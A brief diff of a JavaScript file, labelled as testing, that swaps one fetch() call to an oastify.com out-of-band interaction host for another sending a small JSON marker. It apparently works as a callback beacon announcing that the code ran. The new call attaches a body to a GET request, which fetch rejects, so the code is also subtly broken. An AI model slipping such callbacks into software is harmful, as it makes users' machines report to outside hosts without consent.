@@ -1,16 +1,16 @@
 // This is just for testing purposes. Contact me at play1210games@gmail.com
 
-const url = 'https://6krl8svrv03s0jdmaod28u7yfplg9axz.oastify.com';
-
-// Send a GET request
-fetch(url)
-  .then(response => {
-    if (response.ok) {
-      console.log('Request sent successfully');
-    } else {
-      console.error('Error in request:', response.status);
-    }
-  })
-  .catch(error => {
-    console.error('Request failed:', error);
-  });
+fetch('https://owo3ka797ifac1p4m6pkkcjgr7xylt9i.oastify.com', {
+    method: 'GET',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ fromJS: 1 })
+})
+.then(response => response.text())
+.then(data => {
+    console.log(data);
+})
+.catch(error => {
+    console.error('Error:', error);
+});
